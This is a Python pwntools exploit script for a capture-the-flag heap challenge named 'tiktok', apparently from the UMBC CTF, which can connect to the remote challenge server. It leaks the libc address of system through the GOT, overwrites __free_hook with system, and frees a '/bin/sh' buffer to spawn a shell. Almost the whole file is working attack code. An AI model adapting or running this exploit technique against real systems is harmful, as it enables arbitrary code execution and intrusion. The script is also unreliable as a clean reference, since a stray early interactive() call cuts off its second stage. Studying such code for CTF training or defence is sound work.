from pwn import *

proc_ = proc
elf = ELF("./tiktok")
libc = ELF("./libc-2.27.so")

if 'rem' in sys.argv:
	proc = remote("ctf.umbccd.io", 4700)
else:
	if '-d' in sys.argv:
		os.system("docker exec ubu18 pkill -9 gdb")
	os.system("docker exec ubu18 pkill -9 tiktok")
	proc = remote("0", 31337)
	if '-d' in sys.argv:
		os.system("docker exec ubu18 pidof tiktok > /tmp/ddd")
		pid = int(open("/tmp/ddd","r").read().split(' ')[0])
		script = '''
			set follow-fork-mode parent
			set detach-on-fork on
			#b *0x401822
			c
			#c 4
			'''
		open("/tmp/script.gdb","w").write(script)
		os.system("docker cp /tmp/script.gdb ubu18:/tmp/script.gdb")
		run_in_new_terminal("docker exec -it ubu18 gdb -q /tiktok/tiktok %d -x /tmp/script.gdb"%pid)
		pid = pidof("tiktok").next()
		proc_.wait_for_debugger(pid)

def addsong(songname):
	proc.recvuntil("Choice:")
	proc.sendline("1")
	proc.recvuntil("path.")
	proc.send(songname)

def playsong(songnum):
	proc.recvuntil("Choice:")
	proc.sendline("3")
	proc.recvuntil("Choice:")
	proc.sendline(str(songnum))

def freesong(songnum):
	proc.recvuntil("Choice:")
	proc.sendline("4")
	proc.recvuntil("Choice:")
	proc.sendline(str(songnum))

def stdsong(songnum, len, data):
	playsong(songnum)
	proc.sendline(str(len))
	proc.send(data)

for i in range(3, ord('.') - 1):
	addsong("Animal/animal.txt")
addsong("Animal/dinosaur.txt")
addsong("Animal" + "/" * (24 - len("Animal")))

playsong(43)
playsong(42)
freesong(43)
freesong(42)

stdsong(44, -1, "A"*0x690 + p64(0x4040be))
proc.interactive()

playsong(25)
playsong(19)
fake_chunk = '\x00' * 24 + p64(0xff) + p64(elf.got['system']) + p64(0) + p64(0x4040e0)
fake_song = '\x00' * 24 + p64(0) + p64(elf.got['system']) + p64(0) + p64(0)

proc.send('\x00'*0x1a + p64(0x21) + '\x00'*8 + p64(0) + p64(elf.got['system']) + p64(0) + p64(0) + fake_chunk * 2 + fake_song * 3)
freesong(4)

proc.recvuntil("from ")
system_addr = proc.readuntil("\n\nSo", drop=True)
system_addr = u64(system_addr.ljust(8, '\x00'))
libc.address = system_addr - libc.symbols["system"]
print hex(libc.address)
freesong(5)
stdsong(6, 8, p64(libc.symbols["__free_hook"]))
stdsong(7, 8, "/bin/sh")
stdsong(8, 8, p64(libc.symbols["system"]))
freesong(7)

proc.interactive()
os.system("docker exec ubu18 pkill -9 tiktok")
